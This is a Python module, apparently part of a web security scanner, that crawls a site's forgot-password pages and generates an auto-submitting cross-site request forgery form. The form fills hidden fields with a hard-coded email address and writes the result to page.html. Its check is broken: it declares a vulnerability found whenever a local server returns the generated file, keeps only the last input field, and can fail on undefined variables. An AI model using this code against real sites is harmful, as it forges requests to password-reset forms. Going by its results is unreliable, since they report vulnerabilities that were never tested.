import concurrent.futures
import time
from Tests.Test import Test
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException


class CSRF(Test):
    def __init__(self):
        super().__init__()
        self.cancel = False
        self.name = "CSRF"
        self.future = None

        self.chrome_options = Options()
        self.chrome_options.add_argument("--headless")
        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)

    def run(self, url: str):
        self.cancel = False
        with concurrent.futures.ThreadPoolExecutor() as executor:
            self.future = executor.submit(self.check_CSRF, url)
        self.future = None

    def check_CSRF(self, url):
        if self.cancel:
            self.cancel_result(url)
            return
        # some actions start with / , when adding home page sometimes it ends with / to avoid having the two colide
        # I deleted one
        if url.endswith('/'):
            url = url[0:len(url)-1]

            # print(url)
        self.driver.get(url)
        soup = BeautifulSoup(self.driver.page_source, "html.parser")
        forms = soup.find_all("form")
        details = {}

        if forms:
            # find all the links in a page with a form
            links = soup.find_all("a", href=True)
            for link in links:
                if self.cancel:
                    self.cancel_result(url)
                    return
                # from all the links get the text to search for on containing the word password
                link_link = link.get("href")

                # if found the link with the keyword again check the link if its a directory or a complete link
                # if its just a directory (starts with /) add homepage before it.
                if "password" in link.text:
                    #print(link_link)
                    if str(link_link).startswith(str(url)):
                        new_link_link = link_link
                        print("Link:"+new_link_link)

                    else:
                        new_link_link = url+link_link
                        print("Link:"+new_link_link)

                        #go to forgot password page
                        time.sleep(5)
                        self.driver.get(new_link_link)
                        forgot_soup = BeautifulSoup(self.driver.page_source, "html.parser")
                        forgot_forms = forgot_soup.find_all("form")
                        for form in forgot_forms:
                            if self.cancel:
                                self.cancel_result(url)
                                return
                            #get action,method,input type and name from the forgot password form
                            action = form.attrs.get("action")
                            new_action = action
                            method = form.attrs.get("method")
                            inputs = []
                            inputs_submit = []
                            for input_tag in form.find_all("input"):
                                if self.cancel:
                                    self.cancel_result(url)
                                    return
                                input_type = input_tag.attrs.get("type", "text")
                                input_name = input_tag.attrs.get("name")
                                input_value = input_tag.attrs.get("value")

                                if input_type == "submit":
                                    inputs_submit.append({'type':input_type,'name':input_name,'value':input_value})

                                #this presents the middle part of constructing the malicious html form
                                if input_type =="email":
                                    inputs.append("<input type='hidden' name=" + input_name+" "+ "value=michael.jreij@gmail.com>")
                                if input_type =="text" or input_type == "password":
                                    inputs.append("<input type='hidden' name="+input_name+" "+"value=password>")

                            if  str(action).startswith(str("/")):
                                new_action = url+action

                            #this presents the middle part of constructing the malicious html form
                            malicious_form_firstpart = "<form id="+str(form.get('id'))+" "+"action="+str(new_action)+" " +"method="+str(method)+">"
                            malicious_form_thirdpart = "</form>"

                            #getting all the input fields together
                            i = 0
                            while i < len(inputs):
                                if self.cancel:
                                    self.cancel_result(url)
                                    return
                                form_middle_part = ("".join(inputs[i]))
                                i=i+1


                            malicious_form_finalpart = "<script> document.getElementById("+'"{}"'.format(str(form.get('id')))+").submit();</script>"
                            malicious_form_replacement=""
                            if str(form.get('id')) == "None":
                                malicious_form_finalpart = ""
                                for submit_val in inputs_submit:
                                    malicious_form_replacement = "<input type="'submit'" name= "+ submit_val['name'] +" "+"value="+submit_val['value']+">"
                            final_text = "<!DOCTYPE html> <html> <body>"+malicious_form_firstpart + " "+form_middle_part+malicious_form_replacement+" "+malicious_form_thirdpart+" "+malicious_form_finalpart+"</body> </html>"

                        #Writing the malicious Form to a file
                        open("page.html", "w").write(str(final_text))

                        # This represents the user trying to open the malicious form
                        x = requests.get("http://localhost:8000/page.html")
                        if x.status_code == 200:
                            print("CSRF Vulnerability found on link:"+new_action)
                        self.success(url, new_action)

    def success(self, url, v_url):
        result = f'''CSFR scan done for page {url}\n'''\
                '''Was a success - CSRF Vulnerability found on link:\n'''\
                f'''{v_url}\n'''\
                f'''page.html generated'''
        self.results.append((time.time(), result))

    def cancel_result(self, url):
        result = f'''CSFR for page {url}\n''' \
                 '''Was canceled\n'''
        self.results.append((time.time(), result))
